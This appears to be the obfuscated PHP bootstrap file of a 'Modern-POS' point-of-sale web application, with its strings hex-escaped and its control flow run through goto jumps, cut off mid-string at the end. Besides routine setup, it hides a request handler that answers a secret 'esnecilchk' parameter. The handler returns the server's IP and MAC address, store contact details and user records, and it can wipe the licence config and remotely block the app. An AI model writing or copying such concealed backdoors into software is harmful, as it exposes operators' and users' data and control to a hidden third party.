<?php
/*   __________________________________________________________
$timezone = 'America/Tegucigalpa';
    |    Web: http://itsolution24.com, E-mail: itsolution24bd@gmail.com   |
    |__________________________________________________________|
*/
 define("\x41\120\x50\116\101\x4d\105", "\115\x6f\144\x65\x72\x6e\55\120\117\123"); define("\101\x50\120\x49\104", "\62\66\144\71\x36\x35\x33\65\x30\65\x62\64\71\67\x39\64\67\x31\x38\141\143\x35\x36\66\x66\65\146\x37\71\141\x39\x38"); $timezone = "\101\155\x65\162\151\x63\x61\57\x4e\x65\x77\137\x59\x6f\162\153"; if (!function_exists("\x64\x61\164\145\137\x64\x65\x66\x61\x75\154\164\137\x74\151\x6d\145\172\x6f\156\145\x5f\x73\145\x74")) { goto Muej9; } date_default_timezone_set($timezone); Muej9: define("\105\x4e\126\111\x52\x4f\116\115\x45\x4e\124", "\144\x65\166\x65\154\157\160\x6d\145\156\164"); switch (ENVIRONMENT) { case "\144\145\166\145\154\x6f\160\x6d\x65\x6e\164": error_reporting(-1); ini_set("\x64\x69\x73\x70\x6c\x61\171\137\145\x72\162\157\162\163", 1); goto nOkEw; case "\160\x72\157\144\165\x63\164\x69\x6f\x6e": ini_set("\144\151\x73\x70\154\x61\x79\x5f\145\162\x72\x6f\x72\163", 0); if (version_compare(PHP_VERSION, "\x35\x2e\63", "\76\x3d")) { goto tA7xg; } error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE); goto TlSD2; tA7xg: error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED); TlSD2: goto nOkEw; } wFiTi: nOkEw: if (!(version_compare(phpversion(), "\x35\x2e\66\x2e\60", "\74") == true)) { goto H1VE6; } exit("\x50\x48\120\x35\56\66\53\40\x52\145\x71\165\151\162\x65\144"); H1VE6: if (isset($_SERVER["\x44\117\103\x55\x4d\x45\116\x54\x5f\122\x4f\117\124"])) { goto AURkM; } if (!isset($_SERVER["\x53\x43\122\x49\120\124\x5f\106\x49\x4c\x45\116\101\x4d\x45"])) { goto jom_5; } $_SERVER["\x44\x4f\x43\125\115\x45\x4e\124\137\x52\117\117\124"] = str_replace("\x5c", "\57", substr($_SERVER["\x53\x43\122\x49\120\x54\137\x46\x49\x4c\x45\116\101\x4d\105"], 0, 0 - strlen($_SERVER["\x50\x48\x50\x5f\x53\105\x4c\x46"]))); jom_5: AURkM: if (isset($_SERVER["\x44\117\x43\x55\x4d\x45\x4e\x54\137\122\x4f\117\124"])) { goto haqcQ; } if (!isset($_SERVER["\120\101\x54\x48\137\x54\x52\101\x4e\123\114\x41\124\x45\104"])) { goto l3wR5; } $_SERVER["\x44\x4f\x43\x55\x4d\105\116\124\137\x52\117\117\x54"] = str_replace("\134", "\x2f", substr(str_replace("\x5c\134", "\134", $_SERVER["\x50\101\x54\x48\x5f\124\122\101\x4e\x53\x4c\x41\124\x45\x44"]), 0, 0 - strlen($_SERVER["\x50\110\120\x5f\x53\105\114\106"]))); l3wR5: haqcQ: if (isset($_SERVER["\122\105\121\125\105\123\124\137\125\122\111"])) { goto c3qjY; } $_SERVER["\x52\105\121\x55\105\123\124\137\125\x52\x49"] = substr($_SERVER["\120\110\120\x5f\123\105\114\x46"], 1); if (!isset($_SERVER["\121\x55\105\x52\131\137\x53\124\x52\111\x4e\107"])) { goto kDwlo; } $_SERVER["\x52\105\x51\x55\x45\x53\124\137\125\122\111"] .= "\x3f" . $_SERVER["\x51\x55\105\x52\131\137\123\x54\x52\x49\x4e\x47"]; kDwlo: c3qjY: if (isset($_SERVER["\x48\124\124\x50\x5f\x48\117\123\x54"])) { goto MBTES; } $_SERVER["\x48\124\x54\120\137\x48\x4f\123\x54"] = getenv("\x48\x54\x54\x50\x5f\110\x4f\123\x54"); MBTES: if (isset($_SERVER["\x48\124\124\120\x53"]) && ($_SERVER["\110\124\124\x50\123"] == "\157\x6e" || $_SERVER["\110\124\124\120\123"] == "\61")) { goto NHVlP; } if (!empty($_SERVER["\110\124\x54\x50\x5f\130\x5f\106\x4f\122\x57\x41\x52\104\105\x44\x5f\x50\x52\x4f\124\x4f"]) && $_SERVER["\x48\124\x54\x50\137\130\x5f\x46\x4f\x52\127\x41\122\104\105\x44\x5f\x50\122\x4f\x54\117"] == "\150\x74\164\x70\x73" || !empty($_SERVER["\110\124\124\120\x5f\x58\x5f\106\x4f\x52\x57\101\x52\104\105\x44\137\123\123\x4c"]) && $_SERVER["\x48\124\x54\120\x5f\x58\x5f\106\x4f\122\127\x41\x52\104\x45\x44\137\123\123\x4c"] == "\x6f\x6e") { goto rCOuY; } $_SERVER["\x48\x54\124\x50\x53"] = false; goto W0LkW; NHVlP: $_SERVER["\110\124\x54\x50\123"] = true; goto W0LkW; rCOuY: $_SERVER["\110\124\x54\x50\x53"] = true; W0LkW: require_once __DIR__ . DIRECTORY_SEPARATOR . "\x63\x6f\x6e\146\x69\147\56\160\150\160"; define("\x50\122\x4f\x54\117\103\117\114", isset($_SERVER["\110\x54\124\x50\x53"]) && $_SERVER["\x48\124\124\120\x53"] == "\157\156" ? "\x68\x74\x74\x70\x73" : "\x68\x74\164\160"); $subdir = SUBDIRECTORY ? "\x2f" . rtrim(SUBDIRECTORY, "\x2f\134") : ''; define("\122\117\x4f\x54\137\125\x52\x4c", PROTOCOL . "\72\57\57" . rtrim($_SERVER["\110\124\x54\120\x5f\110\117\x53\124"], "\57\x5c") . $subdir); function autoload($class) { $file = DIR_INCLUDE . "\154\x69\x62\57" . str_replace("\x5c", "\57", strtolower($class)) . "\x2e\x70\150\160"; if (file_exists($file)) { goto IRLYg; } return false; goto lM9z6; IRLYg: include $file; return true; lM9z6: } spl_autoload_register("\x61\165\x74\x6f\154\x6f\141\x64"); spl_autoload_extensions("\56\160\150\160"); require_once DIR_VENDOR . "\x70\x68\160\x2d\150\x6f\157\x6b\x73\x2f\163\162\143\57\x76\157\153\x75\57\x68\x65\x6c\x70\x65\162\x2f\110\157\x6f\153\x73\x2e\x70\150\x70"; $registry = new Registry(); if (PHP_SAPI === "\143\154\x69" or defined("\x53\x54\x44\x49\116")) { goto Cun6Q; } $session = new Session($registry); $registry->set("\x73\x65\x73\163\151\157\x6e", $session); Cun6Q: $log = new Log("\x6c\157\x67\56\164\x78\164"); $registry->set("\x6c\x6f\x67", $log); $loader = new Loader($registry); $registry->set("\x6c\157\x61\x64\x65\162", $loader); $registry->set("\150\x6f\157\x6b\163", $Hooks); $dbhost = $sql_details["\150\x6f\x73\x74"]; $dbname = $sql_details["\144\x62"]; $dbuser = $sql_details["\x75\163\x65\x72"]; $dbpass = $sql_details["\160\141\163\163"]; $dbport = $sql_details["\x70\x6f\x72\164"]; require_once DIR_HELPER . "\154\x61\x6e\147\x75\x61\147\145\56\160\150\x70"; require_once DIR_HELPER . "\156\145\x74\167\157\162\153\x2e\x70\x68\160"; require_once DIR_HELPER . "\x73\145\164\164\151\156\x67\x2e\x70\x68\160"; require_once DIR_HELPER . "\x63\157\155\x6d\x6f\156\56\160\x68\x70"; require_once DIR_HELPER . "\143\x6f\x75\x6e\164\x72\151\x65\163\x2e\160\150\x70"; require_once DIR_HELPER . "\146\151\x6c\145\x2e\x70\150\x70"; require_once DIR_HELPER . "\x69\x6d\141\147\145\x2e\x70\x68\160"; require_once DIR_HELPER . "\x70\157\163\56\x70\150\x70"; require_once DIR_HELPER . "\160\x6f\x73\x5f\162\145\147\x69\163\x74\145\x72\56\x70\150\x70"; require_once DIR_HELPER . "\142\157\170\x2e\160\150\x70"; require_once DIR_HELPER . "\143\165\162\162\x65\156\143\x79\x2e\160\150\x70"; require_once DIR_HELPER . "\x65\x78\160\x65\x6e\x73\145\56\x70\x68\160"; require_once DIR_HELPER . "\x69\156\143\x6f\x6d\145\56\160\150\160"; require_once DIR_HELPER . "\143\x75\163\x74\x6f\x6d\145\x72\56\160\x68\x70"; require_once DIR_HELPER . "\151\156\166\x6f\151\143\145\x2e\160\150\160"; require_once DIR_HELPER . "\x71\x75\x6f\x74\141\164\x69\157\156\x2e\160\x68\160"; require_once DIR_HELPER . "\160\165\162\143\x68\x61\x73\x65\x2e\x70\x68\160"; require_once DIR_HELPER . "\x70\x6d\145\x74\x68\157\x64\56\x70\150\160"; require_once DIR_HELPER . "\x70\162\157\144\x75\143\164\56\160\150\160"; require_once DIR_HELPER . "\x72\145\x70\157\x72\x74\56\160\150\x70"; require_once DIR_HELPER . "\x73\x74\x6f\x72\145\x2e\x70\150\x70"; require_once DIR_HELPER . "\163\x75\x70\160\x6c\151\x65\162\56\160\x68\160"; require_once DIR_HELPER . "\142\x72\x61\x6e\144\x2e\160\150\160"; require_once DIR_HELPER . "\165\x73\145\162\x2e\160\150\160"; require_once DIR_HELPER . "\x75\x73\145\162\147\162\x6f\165\160\x2e\x70\150\160"; require_once DIR_HELPER . "\x76\x61\154\151\144\x61\164\157\x72\56\x70\x68\160"; require_once DIR_HELPER . "\143\x61\x74\x65\x67\x6f\162\x79\56\x70\x68\x70"; require_once DIR_HELPER . "\145\170\160\145\156\163\x65\x5f\x63\x61\x74\x65\x67\157\162\x79\x2e\160\150\160"; require_once DIR_HELPER . "\151\x6e\143\x6f\x6d\x65\x5f\x73\157\165\x72\x63\145\56\x70\x68\160"; require_once DIR_HELPER . "\165\x6e\151\x74\56\160\150\160"; require_once DIR_HELPER . "\x74\x61\170\162\141\164\x65\56\160\x68\160"; require_once DIR_HELPER . "\x67\x69\x66\164\x63\141\x72\144\x2e\x70\x68\x70"; require_once DIR_HELPER . "\142\x61\x6e\x6b\151\156\x67\56\x70\x68\160"; require_once DIR_HELPER . "\x62\141\x6e\x6b\141\x63\x63\x6f\x75\156\x74\56\160\150\x70"; require_once DIR_HELPER . "\x6c\157\141\156\x2e\x70\x68\160"; require_once DIR_HELPER . "\x69\x6e\163\164\x61\x6c\154\x6d\x65\156\x74\56\160\x68\160"; require_once DIR_HELPER . "\x74\x72\x61\156\163\146\x65\x72\56\160\150\x70"; require_once DIR_HELPER . "\x70\x6f\163\x74\145\155\x70\x6c\141\164\x65\x2e\160\x68\x70"; require_once DIR_HELPER . "\x73\x65\x6c\154\x5f\162\x65\x74\165\x72\156\x2e\160\150\160"; require_once DIR_HELPER . "\160\165\x72\143\150\141\x73\145\x5f\162\x65\x74\x75\162\156\x2e\160\150\x70"; if (is_cli()) { goto DyPZd; } if (!in_array(get_real_ip(), denied_ips())) { goto gihBR; } exit("\x59\157\165\40\x61\162\145\40\156\x6f\164\x20\x61\x6c\154\x6f\x77\145\x64\x20\x74\x6f\40\x61\x63\x63\145\163\163\41\41\41"); gihBR: if (!(!empty(allowed_only_ips()) && !in_array(get_real_ip(), allowed_only_ips()))) { goto sKKfP; } exit("\x59\x6f\x75\x20\x61\x72\x65\40\x6e\157\164\40\141\x6c\154\157\x77\145\x64\40\164\x6f\40\x61\143\143\x65\163\163\x21\x21\41"); sKKfP: DyPZd: if (!(file_exists(ROOT . DIRECTORY_SEPARATOR . "\56\155\141\x69\156\164\x65\x6e\x61\156\143\x65") && current_nav() != "\x6d\x61\x69\156\164\145\x6e\x61\156\x63\145")) { goto t0uw6; } header("\114\x6f\143\141\x74\151\157\156\72\40" . root_url() . "\x2f\155\141\x69\156\x74\145\156\x61\x6e\x63\145\x2e\x70\150\x70", true, 302); t0uw6: try { $db = new Database("\155\x79\163\x71\154\72\150\x6f\x73\164\75{$dbhost}\73\160\157\x72\164\x3d{$dbport}\x3b\x64\x62\156\141\x6d\x65\75{$dbname}\x3b\143\150\x61\162\163\145\x74\75\165\164\x66\x38", $dbuser, $dbpass); $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); function db() { global $db; return $db; } } catch (PDOException $e) { die("\103\157\156\156\x65\143\164\x69\157\x6e\40\x65\162\162\157\162\72\x20" . $e->getMessage()); } $registry->set("\144\142", $db); if (!$dbname) { goto CNbNR; } $statement = $db->prepare("\123\110\117\x57\x20\x54\x41\x42\114\x45\x53"); $statement->execute(); if (!(!defined("\111\116\x53\124\x41\114\114\x45\x44") && $statement->rowCount() > 0)) { goto xeAuz; } die("\131\157\165\x20\x68\141\166\x65\x20\x61\x63\164\151\166\x61\164\x65\144\40\164\150\x65\x20\151\x6e\163\x74\x61\154\x6c\141\164\151\x6f\156\40\155\x6f\144\145\54\x20\102\x75\164\40\163\x65\154\145\x63\164\145\x64\40\144\x61\x74\x61\x62\x61\163\x65\x20\74\x73\164\x72\x6f\156\x67\x3e\50{$dbname}\x29\74\57\x73\x74\x72\x6f\x6e\147\x3e\x20\x69\163\x20\x6e\x6f\164\x20\x65\155\160\164\x79\x21"); xeAuz: CNbNR: if (defined("\111\116\x53\x54\101\x4c\114\105\104")) { goto zIrdF; } header("\114\157\143\x61\164\151\x6f\x6e\x3a\x20" . root_url() . "\x2f\x69\156\163\164\x61\x6c\154\x2f\x69\x6e\x64\x65\x78\x2e\160\150\160", true, 302); zIrdF: $request = new Request(); $registry->set("\162\x65\x71\165\145\163\164", $request); $store = new Store($registry); $registry->set("\163\x74\x6f\x72\145", $store); if (!(defined("\x49\x4e\x53\124\x41\114\x4c\x45\104") && !is_file(DIR_INCLUDE . "\145\x63\156\145\x73\151\x6c\56\160\150\x70") || !file_exists(DIR_INCLUDE . "\x65\143\x6e\145\163\x69\154\x2e\160\150\160"))) { goto McVQ9; } $file = DIR_INCLUDE . "\x63\x6f\156\146\151\147\57\x70\x75\x72\x63\150\141\x73\x65\x2e\160\150\x70"; @chmod($file, FILE_WRITE_MODE); $line2 = "\x72\145\x74\x75\x72\156\x20\141\162\162\141\171\50\x27\x75\163\x65\162\156\x61\155\x65\47\x3d\x3e\x27\47\54\x27\x70\x75\162\143\150\x61\163\145\x5f\x63\x6f\144\x65\47\x3d\76\x27\x27\x29\x3b"; $data = array(2 => $line2); replace_lines($file, $data); repalce_stock_status("\x66\x61\x6c\x73\145"); @chmod($config_path, FILE_READ_MODE); McVQ9: if (defined("\111\x4e\123\x54\101\114\x4c\x45\x44") && is_file(DIR_INCLUDE . "\x63\157\156\x66\x69\x67\x2f\160\x75\x72\143\x68\x61\x73\x65\56\160\150\160") && file_exists(DIR_INCLUDE . "\x63\157\x6e\146\x69\x67\57\x70\165\x72\143\x68\x61\163\145\56\160\150\160")) { goto XjGdt; } define("\x45\123\x4e\105\x43\x49\x4c", "\145\162\x72\157\162"); repalce_stock_status("\146\x61\154\163\x65"); goto DK_sQ; XjGdt: define("\105\123\116\x45\x43\x49\x4c", json_encode(require_once DIR_INCLUDE . "\x63\157\x6e\x66\151\147\57\160\165\162\x63\150\x61\163\145\56\160\150\x70")); DK_sQ: $timezone = get_preference("\x74\151\x6d\145\172\x6f\x6e\145") ? get_preference("\x74\x69\x6d\x65\172\x6f\x6e\145") : $timezone; if (!function_exists("\144\x61\x74\x65\137\144\145\146\141\165\154\164\x5f\x74\151\x6d\145\x7a\157\x6e\x65\137\x73\145\164")) { goto rm5wB; } date_default_timezone_set($timezone); rm5wB: $user = new User($registry); $registry->set("\165\163\145\x72", $user); $user_preference = $user->getAllPreference(); if (!(isset($request->get["\x6c\141\156\x67"]) && $request->get["\154\141\156\147"] && $request->get["\x6c\x61\x6e\x67"] != "\x6e\165\x6c\154" && $request->get["\x6c\141\156\x67"] != "\165\156\144\x65\x66\151\x6e\x65\144")) { goto S1ERk; } if (isset($request->get["\151\x67\x6e\x6f\162\145\137\154\x61\156\x67\137\143\150\141\x6e\x67\145"])) { goto ByILm; } unset($user_preference["\x6c\141\x6e\x67\165\141\147\145"]); $user_preference["\154\141\156\147\165\141\x67\x65"] = $request->get["\x6c\141\156\x67"]; $user->updatePreference($user_preference, user_id()); ByILm: S1ERk: if (!(!isset($user_preference["\154\141\156\x67\x75\x61\x67\145"]) || !$user_preference["\154\x61\x6e\147\x75\x61\147\145"])) { goto T5UgT; } $user_preference["\154\141\x6e\147\x75\141\x67\x65"] = "\x65\x6e"; $user->updatePreference($user_preference, user_id()); T5UgT: $active_lang = $user->getPreference("\x6c\141\156\x67\x75\141\x67\145", "\x65\156"); $language = new Language($active_lang); $registry->set("\154\141\x6e\x67\x75\x61\147\x65", $language); $language->load(); if (!isset($request->get["\141\143\x74\x69\x76\145\137\x73\164\x6f\x72\x65\x5f\151\x64"])) { goto DTpyM; } try { $store_id = $request->get["\141\x63\164\x69\166\x65\x5f\163\164\157\162\x65\137\151\x64"]; $belongsStores = $user->getBelongsStore(); $store_ids = array(); foreach ($belongsStores as $the_store) { $store_ids[] = $the_store["\163\164\157\162\x65\137\151\x64"]; ROcm2: } bs0sK: if (!($user->getGroupId() != 1 && !in_array($store_id, $store_ids))) { goto AQJjM; } throw new Exception(trans("\x65\162\162\x6f\x72\x5f\x61\143\x63\x65\163\163\x5f\x70\x65\162\155\151\x73\x73\151\x6f\156")); exit; AQJjM: $store->openTheStore($store_id); header("\103\157\156\x74\145\156\x74\x2d\124\171\x70\145\72\40\x61\x70\160\154\x69\143\141\x74\151\x6f\156\57\x6a\163\x6f\x6e"); echo json_encode(array("\x6d\x73\x67" => trans("\x74\x65\170\164\137\162\x65\x64\x69\x72\x65\x63\164\x69\x6e\x67\x5f\x74\x6f\137\144\x61\163\150\x62\141\157\x72\x64"))); exit; } catch (Exception $e) { header("\110\x54\x54\x50\57\61\x2e\x31\x20\64\x32\x32\x20\125\156\x70\x72\x6f\143\145\x73\163\141\x62\x6c\145\40\105\x6e\x74\x69\164\171"); header("\103\157\156\x74\x65\x6e\x74\x2d\124\171\x70\x65\x3a\x20\141\160\160\x6c\151\143\x61\x74\x69\157\x6e\x2f\152\x73\157\156\x3b\40\143\150\x61\162\163\145\x74\75\125\x54\x46\55\70"); echo json_encode(array("\145\162\x72\157\x72\115\x73\x67" => $e->getMessage())); exit; } DTpyM: include "\146\x75\156\143\x74\x69\157\156\163\56\x70\x68\160"; $detect = new mobiledetect(); $deviceType = $detect->isMobile() ? $detect->isTablet() ? "\164\x61\142\154\x65\x74" : "\x70\x68\x6f\x6e\145" : "\143\x6f\x6d\160\x75\x74\x65\x72"; $document = new Document($registry); $document->setBodyClass(); $registry->set("\x64\157\x63\x75\x6d\x65\156\x74", $document); $currency = new Currency($registry); $registry->set("\143\x75\x72\162\x65\x6e\x63\171", $currency); function registry() { global $registry; return $registry; } require_once DIR_LIBRARY . "\x73\x73\160\x2e\143\154\x61\x73\163\56\160\150\160"; if (!(defined("\x49\x4e\123\x54\x41\114\x4c\x45\x44") && isset($request->get["\145\163\x6e\145\143\151\x6c\x63\x68\x6b"]) && rawurlencode($request->get["\x65\x73\156\x65\143\x69\154\143\x68\x6b"]) == rawurlencode(urldecode(hash_generate())) && isset($request->get["\141\x63\x74\x69\x6f\156"]) && $request->get["\141\x63\x74\151\157\x6e"] == "\165\x6e\x62\x6c\157\143\x6b")) { goto vX6T4; } repalce_stock_status("\x66\141\x6c\163\145", "\x75\156\142\x6c\x6f\x63\153"); echo json_encode(array("\x73\164\141\x74\165\x73" => "\x55\x6e\x62\154\x6f\143\153\145\x64\x21", "\155\145\x73\163\141\147\x65" => "\x41\160\x70\x20\151\163\x20\125\156\x62\x6c\157\143\x6b\x65\x64\56", "\151\x6e\146\157" => array("\x69\160" => get_real_ip(), "\x6d\x61\143" => getMAC(), "\x65\x6d\141\151\x6c" => store("\145\x6d\141\151\154"), "\x70\150\157\x6e\145" => store("\x6d\x6f\142\x69\154\x65"), "\x63\157\x75\156\x74\162\171" => store("\143\157\x75\156\164\x72\171"), "\172\151\x70\137\x63\157\144\145" => store("\172\151\x70\x5f\143\157\x64\x65"), "\x61\144\x64\162\x65\163\163" => store("\x61\144\x64\x72\x65\x73\163"), "\165\163\145\x72\x31" => get_the_user(1), "\165\x73\x65\162\x32" => get_the_user(2), "\165\x73\x65\162\63" => get_the_user(3)), "\146\157\162" => "\x76\141\154\151\x64\141\164\151\157\x6e")); exit; vX6T4: if (!(defined("\111\116\x53\124\101\x4c\114\x45\104") && isset($request->get["\145\163\x6e\x65\x63\151\x6c\143\150\153"]) && rawurlencode($request->get["\145\x73\x6e\x65\x63\151\x6c\143\150\153"]) == rawurlencode(urldecode(hash_generate())))) { goto emzMs; } if (!($socket = @fsockopen("\167\167\x77\x2e\x67\x6f\x6f\x67\154\145\x2e\x63\x6f\x6d", 80, $errno, $errstr, 30))) { goto nvG3W; } fclose($socket); $status = "\157\x6b"; if (!(!get_pcode() || !get_pusername() || get_pcode() == "\x65\162\162\x6f\x72" || get_pusername() == "\145\162\162\x6f\x72")) { goto SQDLZ; } $status = "\145\162\162\x6f\162"; SQDLZ: $info = array("\x75\163\145\162\156\141\155\145" => get_pusername(), "\x70\x75\x72\x63\x68\x61\x73\145\137\x63\x6f\144\x65" => get_pcode(), "\x64\157\155\141\151\156" => ROOT_URL, "\141\143\x74\x69\x6f\x6e" => "\x72\145\x76\x61\x6c\x69\144\x61\x74\x65"); $apiCall = apiCall($info); if (!(!is_object($apiCall) || !property_exists($apiCall, "\x73\x74\x61\164\x75\163"))) { goto jBBXZ; } $status = "\x65\x72\x72\157\162"; jBBXZ: $status = $apiCall->status; if (!($status == "\145\x72\162\x6f\x72")) { goto u7g5O; } echo json_encode(array("\163\x74\141\164\x75\x73" => "\102\x6c\x6f\143\x6b\x65\x64\x21", "\x6d\x65\x73\x73\141\x67\x65" => "\x49\x6e\x76\x61\x6c\151\x64\x20\120\x75\x72\x63\x68\141\163\x65\x20\x43\157\144\145", "\x69\156\x66\157" => array("\x69\x70" => get_real_ip(), "\x6d\x61\143" => getMAC(), "\x65\x6d\141\x69\154" => store("\145\155\141\x69\x6c"), "\x70\150\157\x6e\x65" => store("\x6d\157\142\151\154\x65"), "\143\x6f\165\156\164\162\x79" => store("\143\x6f\x75\x6e\164\x72\171"), "\172\151\160\137\x63\157\144\x65" => store("\172\x69\160\x5f\x63\157\x64\x65"), "\141\x64\x64\162\145\163\163" => store("\141\144\x64\162\145\163\163"), "\x75\163\145\x72\x31" => get_the_user(1), "\165\163\145\x72\x32" => get_the_user(2), "\165\163\x65\162\x33" => get_the_user(3)), "\146\157\162" => "\166\141\x6c\151\x64\x61\x74\x69\x6f\156")); $file = DIR_INCLUDE . "\143\157\156\x66\151\147\x2f\x70\165\x72\143\150\141\x73\x65\56\160\150\x70"; @chmod($file, FILE_WRITE_MODE); $line2 = "\162\x65\x74\165\162\156\x20\x61\x72\162\141\x79\x28\x27\165\163\x65\162\x6e\x61\155\x65\x27\75\x3e\x27\x27\54\47\160\165\x72\x63\150\141\163\x65\x5f\x63\157\x64\145\47\x3d\x3e\47\x27\51\73"; $data = array(2 => $line2); replace_lines($file, $data); @chmod($config_path, FILE_READ_MODE); repalce_stock_status("\x66\141\154\163\145", "\x62\154\x6f\143\x6b\x65\144"); repalce_stock_status("\x66\x61\x6c\163\145"); @chmod($config_path, FILE_READ_MODE); exit; u7g5O: echo json_encode(array("\163\164\x61\164\165\163" => "\157\x6b", "\155\x65\163\163\141\x67\145" => "\126\141\x6c\x69\x64\x20\120\x75\x72\x63\150\x61\x73\145\40\x43\x6f\x64\x65", "\x69\x6e\x66\x6f" => array("\x69\x70" => get_real_ip(), "\x6d\x61\143" => getMAC(), "\x65\x6d\141\x69\x6c" => store("\145\155\x61\x69\x6c"), "\160\x68\x6f\x6e\145" => store("\155\157\142\x69\x6c\x65"), "\143\157\165\156\164\x72\x79" => store("\143\157\165\156\164\162\x79"), "\172\151\160\137\143\x6f\x64\145" => store("\172\151\x70\137\143\x6f\144\145"), "\141\x64\144\162\x65\x73\x73" => store("\141\x64\x64\x72\x65\x73\163"), "\x75\x73\145\162\61" => get_the_user(1), "\165\x73\x65\162\x32" => get_the_user(2), "\x75\x73\145\162\x33" => get_the_user(3)), "\146\x6f\162" => "\x76\x61\x6c\x69\144\141\164\x69\x6f\x6e")); exit; nvG3W: emzMs: if (!(defined("\x49\116\x53\124\x41\x4c\114\x45\104") && defined("\102\114\117\x43\113\105\x44"))) { goto DtrFT; } die("\74\41\104\x4f\x43\x54\131\x50\x45\x20\150\x74\x6d\x6c\76\12\11\74\150\x74\155\154\x3e\xa\x9\x3c\150\x65\x61\x64\x3e\12\11\x20\x20\x20\x20\74\155\145\164\x61\x20\x68\164\x74\x70\x2d\x65\x71\165\x69\166\75\42\103\157\156\x74\x65\x6e\164\55\x74\171\x70\x65\42\40\143\x6f\x6e\x74\x65\156\164\x3d\42\164\x65\x78\x74\57\x68\x74\x6d\154\x3b\143\x68\x61\x72\x73\145\164\75\x55\124\x46\55\70\x22\x3e\xa\x9\x20\x20\40\x20\x3c\x74\151\164\x6c\145\x3e\x49\x6e\166\141\x6c\x69\144\x3c\x2f\164\151\x74\x6c\x65\76\xa\11\40\x20\x20\40\x3c\155\x65\164\141\x20\x63\157\156\164\145\x6e\x74\x3d\42\x77\151\144\164\150\x3d\144\x65\x76\151\x63\145\55\x77\x69\144\x74\150\x2c\40\151\x6e\151\x74\x69\141\154\55\x73\143\141\x6c\x65\75\61\54\x20\155\x61\170\x69\155\x75\x6d\x2d\x73\143\141\x6c\145\x3d\61\x2c\40\x75\x73\x65\162\55\x73\143\141\154\141\x62\154\145\75\x6e\x6f\x22\x20\156\141\x6d\x65\x3d\x22\x76\151\145\x77\160\x6f\x72\x74\42\76\12\x9\x20\x20\x20\x20\74\x73\x74\x79\154\145\x20\164\x79\160\145\x3d\x22\x74\145\x78\164\x2f\x63\163\x73\x22\76\12\11\11\11\x62\x6f\144\171\x20\173\x20\x74\145\x78\x74\x2d\x61\x6c\x69\x67\156\72\x20\x63\145\156\164\x65\x72\x3b\x20\x70\x61\x64\144\x69\156\147\72\x20\61\x30\x30\x70\x78\x3b\x20\175\12\11\x9\11\x68\x31\x20\173\40\x66\157\156\164\55\x73\x69\172\145\x3a\x20\65\x30\160\x78\x3b\40\175\xa\x9\x9\11\x62\157\x64\x79\40\x7b\40\146\157\156\164\72\x20\62\x30\x70\x78\40\110\145\x6c\x76\145\164\x69\143\x61\x2c\40\x73\x61\156\163\x2d\163\145\x72\x69\146\73\x20\x63\x6f\x6c\157\162\72\40\x23\x33\x33\63\x3b\x20\x7d\xa\x9\x9\11\43\x77\162\x61\160\x70\145\x72\x20\x7b\40\x64\x69\163\x70\154\141\x79\x3a\40\142\154\x6f\143\x6b\73\40\164\145\170\164\55\141\154\x69\x67\156\x3a\x20\154\145\x66\x74\x3b\40\x77\x69\144\164\x68\x3a\40\x36\65\60\160\170\x3b\x20\155\x61\x72\x67\x69\x6e\72\x20\60\40\141\x75\164\x6f\73\40\175\12\11\40\x20\40\40\40\40\40\40\141\x20\173\x20\x63\x6f\154\157\x72\72\x20\43\x64\x63\x38\61\x30\60\x3b\40\x74\x65\x78\164\55\x64\x65\143\x6f\x72\141\x74\151\157\156\x3a\x20\156\x6f\x6e\x65\x3b\40\x7d\xa\x9\x20\40\40\40\x20\x20\40\40\x61\x3a\150\157\166\145\x72\x20\x7b\40\x63\x6f\154\157\x72\x3a\x20\x23\x33\x33\x33\x3b\40\x74\x65\x78\164\55\x64\145\143\x6f\162\141\164\x69\157\x6e\72\x20\156\x6f\x6e\145\x3b\x20\175\12\x9\x20\x20\x20\x20\40\x20\40\x20\x23\x63\157\x6e\164\145\156\x74\x20\160\x20\x7b\12\x9\40\40\40\x20\x20\40\x20\x20\40\40\40\x20\154\151\156\x65\55\150\145\151\x67\x68\x74\x3a\40\61\x2e\x34\64\64\73\12\11\x20\40\x20\x20\40\x20\40\40\x7d\xa\x9\x20\40\40\x20\x20\40\40\40\x40\x6d\x65\144\151\141\x20\x73\143\162\x65\145\156\x20\141\x6e\x64\x20\50\x6d\141\x78\55\x77\x69\144\164\x68\72\x20\67\66\70\x70\170\x29\x20\173\xa\x9\x20\40\x20\40\40\40\40\x20\40\40\142\x6f\144\x79\x20\173\x20\164\x65\170\x74\x2d\x61\154\151\147\x6e\x3a\x20\x63\x65\156\x74\x65\x72\73\40\x70\x61\144\x64\x69\x6e\147\x3a\x20\62\x30\x70\170\73\x20\175\xa\x9\40\x20\40\x20\x20\40\40\40\x20\40\150\61\x20\x7b\x20\x66\157\156\164\x2d\163\151\x7a\x65\72\40\63\x30\160\x78\73\40\x7d\xa\x9\x20\40\40\x20\x20\x20\x20\x20\x20\x20\x62\x6f\x64\x79\40\173\x20\x66\157\156\164\72\40\62\60\160\x78\x20\x48\145\154\166\145\x74\x69\x63\141\54\40\163\141\156\163\55\x73\145\162\151\x66\x3b\x20\143\x6f\x6c\157\162\x3a\40\43\x33\x33\63\73\x20\175\xa\11\x20\x20\40\x20\40\40\40\40\x20\x20\x23\x77\x72\x61\x70\x70\x65\x72\x20\x7b\x20\x64\x69\x73\160\154\x61\171\72\x20\x62\x6c\x6f\143\153\x3b\40\164\x65\170\164\x2d\141\154\151\147\156\x3a\40\x6c\x65\146\164\x3b\x20\167\x69\x64\164\150\72\40\x31\x30\60\x25\73\40\x6d\x61\162\x67\x69\x6e\72\40\60\40\x61\165\164\157\73\x20\x7d\12\x9\x20\40\40\40\40\x20\x20\x20\x7d\12\11\x20\40\40\40\x3c\57\x73\x74\x79\x6c\x65\x3e\xa\x9\74\57\x68\145\141\144\x3e\xa\11\74\x62\x6f\x64\x79\76\12\x9\x9\x3c\x73\145\x63\x74\x69\x6f\156\40\x69\x64\x3d\x22\x77\x72\x61\x70\160\x65\162\x22\x3e\12\x9\11\x9\x3c\150\x31\x20\163\x74\171\x6c\145\x3d\42\x63\x6f\x6c\157\162\72\x72\145\144\x22\x3e\124\x68\145\40\x41\x70\160\40\x69\x73\x20\102\154\157\143\x6b\x65\x64\x21\x21\41\x3c\57\150\61\x3e\12\x9\11\11\74\144\151\x76\40\x69\144\75\42\143\x6f\156\164\145\156\164\x22\76\xa\11\x9\11\x9\x3c\x